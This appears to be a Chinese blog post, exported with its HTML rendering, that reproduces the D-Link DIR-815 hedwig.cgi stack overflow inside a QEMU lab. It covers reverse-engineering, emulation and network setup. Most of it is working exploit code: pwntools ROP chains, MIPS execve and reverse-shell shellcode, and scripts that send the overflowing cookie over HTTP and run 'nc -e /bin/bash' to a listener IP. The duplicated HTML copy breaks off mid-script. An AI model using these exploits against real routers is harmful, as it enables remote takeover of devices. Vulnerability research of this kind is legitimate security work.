hedwigcgi函数分析\n\n![hedwigcgi](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807193447008.png)\n\n先获取环境环境变量，REQUEST_METHOD,当这个值为POST时，程序继续运行cgibin_parse_request()，进入该函数分析\n\n![hedwigcgi](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807194034588.png)\n\n发现似乎是解析获取环境变量的，返回上层函数，往下分析\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807194403775.png)\n\n接下来会执行sess_get_uid()函数，进入函数分析\n\n![sess_get_uid](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807195355928.png)\n\n![sess_get_uid](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807210059982.png)\n\n如果v2也就是\"=\"前面的字符串是uid，就会把v4的值返回，返回上层函数继续分析\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807202727044.png)\n\n这里的string就是处理了uid之后的内容，sprintf 函数存在溢出的可能。\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807202901421.png)\n\n在函数后面，有个类似的sprinf，而且两个sprintf之间没有对v4 改变，所以v20和string是一样的。v27只有1024个字节大小，所以可以溢出。\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807213459396.png)\n\n因为haystack默认值为0，所以要控制它为1，才能不进入if。同时上面的路径要存在，否则也会进入if里。如何控制haystack呢？\n\n### haystack变量控制分析\n\n![haystack](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808144001612.png)\n\n通过交叉引用查看，发现在sub_409A6c中有对该变量的操作， 继续查看该函数的交叉引用\n\n![main](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808144244466.png)\n\n发现在cgibin_parse_request中有调用\n\n![cgibin_parse_request](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808151711845.png)\n\n在这里进行了调用，参数是a1是sub_409ac6,\n\n![off_42c014](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152204598.png)\n\n这个地址，第一次进循环就正确，此时应该调用的是sub_0x403b10函数，继续\n\n![sub_0x403b10](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152327478.png)\n\n调用了sub_402ffc 函数，继续进入分析\n\n![sub_402ffc](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152442511.png)\n\n![sub_402ffc](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152503518.png)\n\n这里会进一步调用sub_402b40函数，参数&v11，这个地址与我们的v14相邻，而v14被赋值为了关键函数的地址。继续深入分析\n\n![sub_402b40](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152908972.png)\n\na1就是刚才的&v11，这里作为Dword指针，v9就是我们的sub_409A6c函数，参数也是刚才保存在栈上的数据。\n\n因此，要执行到有溢出漏洞的地方必须满足**环境变量`REQUEST_URI`中必须有内容**，环境变量`CONTENT_TYPE`仍然是老规矩`application/x-www-form-urlencoded`，要是POST方法\n\n## ROP链构造\n\n### 准备工作\n\n1. 先在var目录下创建一个tmp文件夹\n2. mipsrop下载[[环境搭建 & 工具]]\n\n### 纯ROP\n\n```\nfrom pwn import *\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n \nlibc_base = 0x7F738000\n \npayload = b'a'*0x3cd\npayload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1\npayload += p32(libc_base + 0x159F4) # s1  move $t9, $s0 (=> jalr $t9)\npayload += b'a'*4\npayload += p32(libc_base + 0x6DFD0) # s3  /bin/sh\npayload += b'a'*(4*2)\npayload += p32(libc_base + 0x32A98) # s6  addiu $s0, 1 (=> jalr $s1)\npayload += b'a'*(4*2)\npayload += p32(libc_base + 0x13F8C) # ra  move $a0, $s3 (=> jalr $s6)\n \npayload = b\"uid=\" + payload\npost_content = \"peruy=pwner\"\nio = process(b\"\"\"\n    qemu-mipsel -L ./ \\\n    -0 \"hedwig.cgi\" \\\n    -E REQUEST_METHOD=\"POST\" \\\n    -E CONTENT_LENGTH=11 \\\n    -E CONTENT_TYPE=\"application/x-www-form-urlencoded\" \\\n    -E HTTP_COOKIE=\\\"\"\"\" + payload + b\"\"\"\\\" \\\n    -E REQUEST_URI=\"2333\" \\\n    ./htdocs/cgibin\n\"\"\", shell = True)\nio.send(post_content)\nio.interactive()\n```\n\n### ROP + shellcode\n\n```\nfrom pwn import *\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n \nlibc_base = 0x7F738000\n \npayload = b'a'*0x3cd\npayload += b'a'*4\npayload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=> lw... => jalr $t9)\npayload += b'a'*4\npayload += p32(libc_base + 0x56BD0) # s3  sleep\npayload += b'a'*(4*5)\npayload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=> jalr $s1)\n \npayload += b'a'*0x18\npayload += b'a'*(4*4)\npayload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=> jalr $t9)\npayload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=> jalr $s4)\n \nshellcode = asm('''\n    slti $a2, $zero, -1\n    li $t7, 0x69622f2f\n    sw $t7, -12($sp)\n    li $t6, 0x68732f6e\n    sw $t6, -8($sp)\n    sw $zero, -4($sp)\n    la $a0, -12($sp)\n    slti $a1, $zero, -1\n    li $v0, 4011\n    syscall 0x40404\n''')\npayload += b'a'*0x18\npayload += shellcode\n \npayload = b\"uid=\" + payload\npost_content = \"peruy=pwner\"\nio = process(b\"\"\"\n    qemu-mipsel -L ./ \\\n    -0 \"hedwig.cgi\" \\\n    -E REQUEST_METHOD=\"POST\" \\\n    -E CONTENT_LENGTH=11 \\\n    -E CONTENT_TYPE=\"application/x-www-form-urlencoded\" \\\n    -E HTTP_COOKIE=\\\"\"\"\" + payload + b\"\"\"\\\" \\\n    -E REQUEST_URI=\"2333\" \\\n    ./htdocs/cgibin\n\"\"\", shell = True)\nio.send(post_content)\nio.interactive()\n```\n\n## 虚拟机网络配置\n### ✅ 步骤一：禁用 NetworkManager 对 `eth0` 和 `br0` 的管理\n\n编辑或创建一个配置文件：\n\n\n```bash\nsudo nano /etc/NetworkManager/conf.d/99-unmanaged-devices.conf\n```\n\n添加以下内容：\n\n```ini\n[keyfile]\nunmanaged-devices=interface-name:eth0;interface-name:br0\n```\n\n保存后重启 NetworkManager：\n\n```bash\nsudo systemctl restart NetworkManager\n```\n\n---\n\n### ✅ 步骤二：创建 Netplan 配置文件\n\n备份原来的：\n\n```bash\nsudo mv /etc/netplan/01-network-manager-all.yaml /etc/netplan/01-network-manager-all.yaml.bak\n```\n\n创建新配置：\n\n```bash\nsudo nano /etc/netplan/01-bridge.yaml\n```\n\n内容如下（根据你实际接口名修改，比如 `ens33` 换成 `eth0`）：\n\n\n```yaml\nnetwork:\n  version: 2\n  renderer: networkd\n  ethernets:\n    eth0:\n      dhcp4: no\n  bridges:\n    br0:\n      interfaces: [eth0]\n      dhcp4: yes\n      parameters:\n        stp: false\n        forward-delay: 0\n```\n\n> ⚠️ 注意：  \n> 如果你虚拟机里的接口名是 `ens33` 而不是 `eth0`，请把上面两处 `eth0` 改成 `ens33`。\n\n---\n\n### ✅ 步骤三：应用配置\n\n```bash\nsudo netplan apply\n```\n\n---\n\n### ✅ 验证\n\n```bash\nip addr show br0\nip route\n```\n\n你应该能看到 `br0` 拿到了 DHCP 地址，`eth0` 没有 IP。\n\n## 下载镜像\nhttps://people.debian.org/~aurel32/qemu/mipsel/\n下载其中的`vmlinux-3.2.0-4-4kc-malta`内核以及`debian_squeeze_mipsel_standard.qcow2`镜像文件\n\n## qemu系统下\n\n### 启动脚本\n```\n#!/bin/bash\nsudo qemu-system-mipsel \\\n    -M malta -kernel vmlinux-3.2.0-4-4kc-malta \\\n    -hda debian_squeeze_mipsel_standard.qcow2 \\\n    -append \"root=/dev/sda1 console=tty0\" \\\n    -net nic,macaddr=00:16:3e:00:00:01 \\\n    -net tap\n```\n### http_cond\n\n在qemu 中 /root/squashfs-root/ 下创建\n\n```\nUmask 026\nPIDFile /var/run/httpd.pid\nLogGMT On  #开启log\nErrorLog /log #log文件\n \nTuning\n{\n    NumConnections 15\n    BufSize 12288\n    InputBufSize 4096\n    ScriptBufSize 4096\n    NumHeaders 100\n    Timeout 60\n    ScriptTimeout 60\n}\n \nControl\n{\n    Types\n    {\n        text/html    { html htm }\n        text/xml    { xml }\n        text/plain    { txt }\n        image/gif    { gif }\n        image/jpeg    { jpg }\n        text/css    { css }\n        application/octet-stream { * }\n    }\n    Specials\n    {\n        Dump        { /dump }\n        CGI            { cgi }\n        Imagemap    { map }\n        Redirect    { url }\n    }\n    External\n    {\n        /usr/sbin/phpcgi { php }\n    }\n}\n \n \nServer\n{\n    ServerName \"Linux, HTTP/1.1, \"\n    ServerId \"1234\"\n    Family inet\n    Interface eth1 #对应qemu仿真路由器系统的网卡\n    Address 192.168.225.129 #qemu仿真路由器系统的IP\n    Port \"1234\" #对应未被使用的端口\n    Virtual\n    {\n        AnyHost\n        Control\n        {\n            Alias /\n            Location /htdocs/web\n            IndexNames { index.php }\n            External\n            {\n                /usr/sbin/phpcgi { router_info.xml }\n                /usr/sbin/phpcgi { post_login.xml }\n            }\n        }\n        Control\n        {\n            Alias /HNAP1\n            Location /htdocs/HNAP1\n            External\n            {\n                /usr/sbin/hnap { hnap }\n            }\n            IndexNames { index.hnap }\n        }\n    }\n}\n```\n\n### net.sh\n\n物理机上运行\n\n```\n#! /bin/sh\nsudo sysctl -w net.ipv4.ip_forward=1\nsudo iptables -F\nsudo iptables -X\nsudo iptables -t nat -F\nsudo iptables -t nat -X\nsudo iptables -t mangle -F\nsudo iptables -t mangle -X\nsudo iptables -P INPUT ACCEPT\nsudo iptables -P FORWARD ACCEPT\nsudo iptables -P OUTPUT ACCEPT\nsudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE\nsudo iptables -I FORWARD 1 -i tap0 -j ACCEPT\nsudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT\n```\n\n### init.sh\n\n在qemu中squashfs-root下创建\n\n```\n#!/bin/bash\necho 0 > /proc/sys/kernel/randomize_va_space\ncp http_conf /\ncp sbin/httpd /\ncp -rf htdocs/ /\nmkdir /etc_bak\ncp -r /etc /etc_bak\nrm /etc/services\ncp -rf etc/ /\ncp lib/ld-uClibc-0.9.30.1.so  /lib/\ncp lib/libcrypt-0.9.30.1.so  /lib/\ncp lib/libc.so.0  /lib/\ncp lib/libgcc_s.so.1  /lib/\ncp lib/ld-uClibc.so.0  /lib/\ncp lib/libcrypt.so.0  /lib/\ncp lib/libgcc_s.so  /lib/\ncp lib/libuClibc-0.9.30.1.so  /lib/\ncd /\nrm -rf /htdocs/web/hedwig.cgi\nrm -rf /usr/sbin/phpcgi\nrm -rf /usr/sbin/hnap\nln -s /htdocs/cgibin /htdocs/web/hedwig.cgi\nln -s /htdocs/cgibin /usr/sbin/phpcgi\nln -s  /htdocs/cgibin /usr/sbin/hnap\n./httpd -f http_conf\n```\n\n### fin.sh\n\nqemu中squashfs-root下创建，退出时运行\n\n```\n#!/bin/bash\nrm -rf /etc\nmv /etc_bak/etc /etc\nrm -rf /etc_bak\n```\n\n\n\n### 开启服务\n\n![访问网站](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810194723866.png)\n\n### run.sh\n```\n#!/bin/bash\nexport CONTENT_LENGTH=\"11\"\nexport CONTENT_TYPE=\"application/x-www-form-urlencoded\"\nexport HTTP_COOKIE=\"uid=`cat payload`\"\nexport REQUEST_METHOD=\"POST\"\nexport REQUEST_URI=\"2333\"\necho \"peruy=pwner\"|./gdbserver.mipsle 192.168.225.154:6666 /htdocs/web/hedwig.cgi\n#echo \"winmt=pwner\"|/htdocs/web/hedwig.cgi\nunset CONTENT_LENGTH\nunset CONTENT_TYPE\nunset HTTP_COOKIE\nunset REQUEST_METHOD\nunset REQUEST_URI\n```\n\n### 查找libc 和 偏移\n\n![qemu调试](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810220153748.png)\n\n### 发送payload\n\n![打通](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250810221044091.png)\n\n## EXP\n\n### 直接发payload\n\n#### ROP链\n\n```python\nfrom pwn import *\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n \ncmd = b'nc -e /bin/bash 192.168.192.128 8888'\n \nlibc_base = 0x77f34000\n \npayload = b'a'*0x3cd\npayload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1\npayload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=> jalr $s0)\npayload += b'a'*(4*7)\npayload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=> jalr $s1)\npayload += b'a'*0x18\npayload += cmd\n \nfd = open(\"payload\", \"wb\")\nfd.write(payload)\nfd.close()\n```\n\n#### ROP+shellcode\n\n```python\nfrom pwn import *\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n \nlibc_base = 0x77f34000\n \npayload = b'a'*0x3cd\npayload += b'a'*4\npayload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=> lw... => jalr $t9)\npayload += b'a'*4\npayload += p32(libc_base + 0x56BD0) # s3  sleep\npayload += b'a'*(4*5)\npayload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=> jalr $s1)\n \npayload += b'a'*0x18\npayload += b'a'*(4*4)\npayload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=> jalr $t9)\npayload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=> jalr $s4)\n \nshellcode = asm('''\n    slti $a0, $zero, 0xFFFF\n    li $v0, 4006\n    syscall 0x42424\n \n    slti $a0, $zero, 0x1111\n    li $v0, 4006\n    syscall 0x42424\n \n    li $t4, 0xFFFFFFFD\n    not $a0, $t4\n    li $v0, 4006\n    syscall 0x42424\n \n    li $t4, 0xFFFFFFFD\n    not $a0, $t4\n    not $a1, $t4\n    slti $a2, $zero, 0xFFFF\n    li $v0, 4183\n    syscall 0x42424\n \n    andi $a0, $v0, 0xFFFF\n    li $v0, 4041\n    syscall 0x42424\n    li $v0, 4041\n    syscall 0x42424\n \n    lui $a1, 0xB821 # Port: 8888\n    ori $a1, 0xFF01\n    addi $a1, $a1, 0x0101\n    sw $a1, -8($sp)\n \n    li $a1, 0x83C0A8C0 # IP: 192.168.192.131\n    sw $a1, -4($sp)\n    addi $a1, $sp, -8\n \n    li $t4, 0xFFFFFFEF\n    not $a2, $t4\n    li $v0, 4170\n    syscall 0x42424\n \n    lui $t0, 0x6962\n    ori $t0, $t0,0x2f2f\n    sw $t0, -20($sp)\n \n    lui $t0, 0x6873\n    ori $t0, 0x2f6e\n    sw $t0, -16($sp)\n \n    slti $a3, $zero, 0xFFFF\n    sw $a3, -12($sp)\n    sw $a3, -4($sp)\n \n    addi $a0, $sp, -20\n    addi $t0, $sp, -20\n    sw $t0, -8($sp)\n    addi $a1, $sp, -8\n \n    addiu $sp, $sp, -20\n \n    slti $a2, $zero, 0xFFFF\n    li $v0, 4011\n    syscall 0x42424\n''')\npayload += b'a'*0x18\npayload += shellcode\n \nfd = open(\"payload\", \"wb\")\nfd.write(payload)\nfd.close()\n```\n\n### 通过http报文\n\n#### ROP链\n\n```python\nfrom pwn import *\nimport requests\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n \ncmd = b'nc -e /bin/bash 192.168.225.128 8888'\n \nlibc_base = 0x77f34000\n \npayload = b'a'*0x3cd\npayload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1\npayload += p32(libc_base + 0x169C4) # s1  addiu $s2, $sp, 0x18 (=> jalr $s0)\npayload += b'a'*(4*7)\npayload += p32(libc_base + 0x32A98) # ra  addiu $s0, 1 (=> jalr $s1)\npayload += b'a'*0x18\npayload += cmd\n \nurl = \"http://192.168.225.129:1234/hedwig.cgi\"\ndata = {\"winmt\" : \"pwner\"}\nheaders = {\n    \"Cookie\"        : b\"uid=\" + payload,\n    \"Content-Type\"  : \"application/x-www-form-urlencoded\",\n    \"Content-Length\": \"11\"\n}\nres = requests.post(url = url, headers = headers, data = data)\nprint(res)\n```\n\n#### ROP链+shellcode\n\n```python\nfrom pwn import *\nimport requests\ncontext(os = 'linux', arch = 'mips', log_level = 'debug')\n \nlibc_base = 0x77f34000\n \npayload = b'a'*0x3cd\npayload += b'a'*4\npayload += p32(libc_base + 0x436D0) # s1  move $t9, $s3 (=> lw... => jalr $t9)\npayload += b'a'*4\npayload += p32(libc_base + 0x56BD0) # s3  sleep\npayload += b'a'*(4*5)\npayload += p32(libc_base + 0x57E50) # ra  li $a0, 1 (=> jalr $s1)\n \npayload += b'a'*0x18\npayload += b'a'*(4*4)\npayload += p32(libc_base + 0x37E6C) # s4  move  $t9, $a1 (=> jalr $t9)\npayload += p32(libc_base + 0x3B974) # ra  addiu $a1, $sp, 0x18 (=> jalr $s4)\n \nshellcode = asm('''\n    slti $a0, $zero, 0xFFFF\n    li $v0, 4006\n    syscall 0x42424\n \n    slti $a0, $zero, 0x1111\n    li $v0, 4006\n    syscall 0x42424\n \n    li $t4, 0xFFFFFFFD\n    not $a0, $t4\n    li $v0, 4006\n    syscall 0x42424\n \n    li $t4, 0xFFFFFFFD\n    not $a0, $t4\n    not $a1, $t4\n    slti $a2, $zero, 0xFFFF\n    li $v0, 4183\n    syscall 0x42424\n \n    andi $a0, $v0, 0xFFFF\n    li $v0, 4041\n    syscall 0x42424\n    li $v0, 4041\n    syscall 0x42424\n \n    lui $a1, 0xB821 # Port: 8888\n    ori $a1, 0xFF01\n    addi $a1, $a1, 0x0101\n    sw $a1, -8($sp)\n \n    li $a1, 0x83C0A8C0 # IP: 192.168.192.131\n    sw $a1, -4($sp)\n    addi $a1, $sp, -8\n \n    li $t4, 0xFFFFFFEF\n    not $a2, $t4\n    li $v0, 4170\n    syscall 0x42424\n \n    lui $t0, 0x6962\n    ori $t0, $t0,0x2f2f\n    sw $t0, -20($sp)\n \n    lui $t0, 0x6873\n    ori $t0, 0x2f6e\n    sw $t0, -16($sp)\n \n    slti $a3, $zero, 0xFFFF\n    sw $a3, -12($sp)\n    sw $a3, -4($sp)\n \n    addi $a0, $sp, -20\n    addi $t0, $sp, -20\n    sw $t0, -8($sp)\n    addi $a1, $sp, -8\n \n    addiu $sp, $sp, -20\n \n    slti $a2, $zero, 0xFFFF\n    li $v0, 4011\n    syscall 0x42424\n''')\npayload += b'a'*0x18\npayload += shellcode\n \nurl = \"http://192.168.192.133:1234/hedwig.cgi\"\ndata = {\"winmt\" : \"pwner\"}\nheaders = {\n    \"Cookie\"        : b\"uid=\" + payload,\n    \"Content-Type\"  : \"application/x-www-form-urlencoded\",\n    \"Content-Length\": \"11\"\n}\nres = requests.post(url = url, headers = headers, data = data)\nprint(res)\n```\n\n我在这里并没有把4个exp 都打完，我只打了发报文的纯ROP链。shellcode 的exp，懒得改ip 地址了\n\n## 参考文章\n\n[[原创] 从零开始复现 DIR-815 栈溢出漏洞-二进制漏洞-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-272318.htm#msg_header_h2_3)","slug":"Iot/DIR-815 栈溢出漏洞","published":1,"date":"2025-08-11T16:59:10.105Z","updated":"2025-08-12T03:47:11.901Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2i9000yuomyf0rv1xul","content":"<h1 id=\"DIR-815-栈溢出漏洞\"><a href=\"#DIR-815-栈溢出漏洞\" class=\"headerlink\" title=\"DIR-815 栈溢出漏洞\"></a>DIR-815 栈溢出漏洞</h1><h2 id=\"环境工具准备\"><a href=\"#环境工具准备\" class=\"headerlink\" title=\"环境工具准备\"></a>环境工具准备</h2><h3 id=\"sasquatch\"><a href=\"#sasquatch\" class=\"headerlink\" title=\"sasquatch\"></a>sasquatch</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 安装依赖库文件</span><br><span class=\"line\">sudo apt-get install build-essential liblzma-dev liblzo2-dev zlib1g-dev</span><br><span class=\"line\"> </span><br><span class=\"line\"># 下载源码</span><br><span class=\"line\">git clone https://github.com/devttys0/sasquatch.git</span><br><span class=\"line\"> </span><br><span class=\"line\"># 源码的编译</span><br><span class=\"line\">(cd sasquatch &amp;&amp; ./build.sh)</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"固件下载\"><a href=\"#固件下载\" class=\"headerlink\" title=\"固件下载\"></a>固件下载</h3><ol>\n<li><a href=\"https://bbs.kanxue.com/elink@892K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3L8h3c8S2M7q4\">DIR-815A1_FW101SSB03.bin</a></li>\n<li><a href=\"https://rebyte.me/en/d-link/89510/file-592084/\">File DIR-815_FIRMWARE_1.01.ZIP — Firmware for D-link DIR-815</a></li>\n<li><a href=\"https://bbs.kanxue.com/thread-273684.htm\">[下载]D-LINK路由器固件–DIR-815_FIRMWARE_1.01-安全工具-看雪-安全社区|安全招聘|kanxue.com</a></li>\n</ol>\n<h2 id=\"解压\"><a href=\"#解压\" class=\"headerlink\" title=\"解压\"></a>解压</h2> <figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">binwalk -Me DIR-815.bin</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二进制文件逆向分析\"><a href=\"#二进制文件逆向分析\" class=\"headerlink\" title=\"二进制文件逆向分析\"></a>二进制文件逆向分析</h2><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807175447631.png\" alt=\"hedwig.cgi\"></p>\n<p>可以看见，<code>/htdocs/web/hedwig.cgi</code>是<code>/htdocs/cgibin</code>的软链接，因此，我们需要逆向分析的二进制文件是<code>/htdocs/cgibin</code></p>\n<p>用ida9.0打开cgibin ，开始分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807192849832.png\" alt=\"main\"></p>\n<p>在main函数中发现hedwigcgi，进入该函数分析</p>\n<h3 id=\"hedwigcgi函数分析\"><a href=\"#hedwigcgi函数分析\" class=\"headerlink\" title=\"hedwigcgi函数分析\"></a>hedwigcgi函数分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807193447008.png\" alt=\"hedwigcgi\"></p>\n<p>先获取环境环境变量，REQUEST_METHOD,当这个值为POST时，程序继续运行cgibin_parse_request()，进入该函数分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807194034588.png\" alt=\"hedwigcgi\"></p>\n<p>发现似乎是解析获取环境变量的，返回上层函数，往下分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807194403775.png\" alt=\"main\"></p>\n<p>接下来会执行sess_get_uid()函数，进入函数分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807195355928.png\" alt=\"sess_get_uid\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807210059982.png\" alt=\"sess_get_uid\"></p>\n<p>如果v2也就是”&#x3D;”前面的字符串是uid，就会把v4的值返回，返回上层函数继续分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807202727044.png\" alt=\"main\"></p>\n<p>这里的string就是处理了uid之后的内容，sprintf 函数存在溢出的可能。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807202901421.png\" alt=\"main\"></p>\n<p>在函数后面，有个类似的sprinf，而且两个sprintf之间没有对v4 改变，所以v20和string是一样的。v27只有1024个字节大小，所以可以溢出。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250807213459396.png\" alt=\"main\"></p>\n<p>因为haystack默认值为0，所以要控制它为1，才能不进入if。同时上面的路径要存在，否则也会进入if里。如何控制haystack呢？</p>\n<h3 id=\"haystack变量控制分析\"><a href=\"#haystack变量控制分析\" class=\"headerlink\" title=\"haystack变量控制分析\"></a>haystack变量控制分析</h3><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808144001612.png\" alt=\"haystack\"></p>\n<p>通过交叉引用查看，发现在sub_409A6c中有对该变量的操作， 继续查看该函数的交叉引用</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808144244466.png\" alt=\"main\"></p>\n<p>发现在cgibin_parse_request中有调用</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808151711845.png\" alt=\"cgibin_parse_request\"></p>\n<p>在这里进行了调用，参数是a1是sub_409ac6,</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152204598.png\" alt=\"off_42c014\"></p>\n<p>这个地址，第一次进循环就正确，此时应该调用的是sub_0x403b10函数，继续</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152327478.png\" alt=\"sub_0x403b10\"></p>\n<p>调用了sub_402ffc 函数，继续进入分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152442511.png\" alt=\"sub_402ffc\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152503518.png\" alt=\"sub_402ffc\"></p>\n<p>这里会进一步调用sub_402b40函数，参数&amp;v11，这个地址与我们的v14相邻，而v14被赋值为了关键函数的地址。继续深入分析</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250808152908972.png\" alt=\"sub_402b40\"></p>\n<p>a1就是刚才的&amp;v11，这里作为Dword指针，v9就是我们的sub_409A6c函数，参数也是刚才保存在栈上的数据。</p>\n<p>因此，要执行到有溢出漏洞的地方必须满足<strong>环境变量<code>REQUEST_URI</code>中必须有内容</strong>，环境变量<code>CONTENT_TYPE</code>仍然是老规矩<code>application/x-www-form-urlencoded</code>，要是POST方法</p>\n<h2 id=\"ROP链构造\"><a href=\"#ROP链构造\" class=\"headerlink\" title=\"ROP链构造\"></a>ROP链构造</h2><h3 id=\"准备工作\"><a href=\"#准备工作\" class=\"headerlink\" title=\"准备工作\"></a>准备工作</h3><ol>\n<li>先在var目录下创建一个tmp文件夹</li>\n<li>mipsrop下载[[环境搭建 &amp; 工具]]</li>\n</ol>\n<h3 id=\"纯ROP\"><a href=\"#纯ROP\" class=\"headerlink\" title=\"纯ROP\"></a>纯ROP</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from pwn import *</span><br><span class=\"line\">context(os = &#x27;linux&#x27;, arch = &#x27;mips&#x27;, log_level = &#x27;debug&#x27;)</span><br><span class=\"line\"> </span><br><span class=\"line\">libc_base = 0x7F738000</span><br><span class=\"line\"> </span><br><span class=\"line\">payload = b&#x27;a&#x27;*0x3cd</span><br><span class=\"line\">payload += p32(libc_base + 0x53200 - 1) # s0  system_addr - 1</span><br><span class=\"line\">payload += p32(libc_base + 0x159F4) # s1  move $t9, $s0 (=&gt; jalr $t9)</span><br><span class=\"line\">payload += b&#x27;a&#x27;*4</span><br><span class=\"line\">payload += p32(libc_base + 0x6DFD0) # s3  /bin/sh</span><br><span class=\"line\">payload += b&#x27;a&#x27;*(4*2)</span><br><span class=\"line\">payload += p32(libc_base + 0x32A98) # s6  addiu $s0, 1 (=&gt; jalr $s1)</span><br><span class=\"line\">payload += b&#x27;a&#x27;*(4*2)</span><br><span class=\"line\">payload += p32(libc_base + 0x13F8C) # ra  move $a0, $s3 (=&gt; jalr $s6)</span><br><span class=\"line\"> </span><br><span class=\"line\">payload = b&quot;uid=&quot; + payload</span><br><span class=\"line\">post_content = &quot;peruy=pwner&quot;</span><br><span class=\"line\">io = process(b&quot;&quot;&quot;</span><br><span class=\"line\">    qemu-mipsel -L ./ \\</span><br><span class=\"line\">    -0 &quot;hedwig.cgi&quot; \\</span><br><span class=\"line\">    -E REQUEST_METHOD=&quot;POST&quot; \\</span><br><span class=\"line\">    -E CONTENT_LENGTH=11 \\</span><br><span class=\"line\">    -E CONTENT_TYPE=&quot;application/x-www-form-urlencoded&quot; \\</span><br><span class=\"line\">    -E HTTP_COOKIE=\\&quot;&quot;&quot;&quot; + payload + b&quot;&quot;&quot;\\&quot; \\</span><br><span class=\"line\">    -E 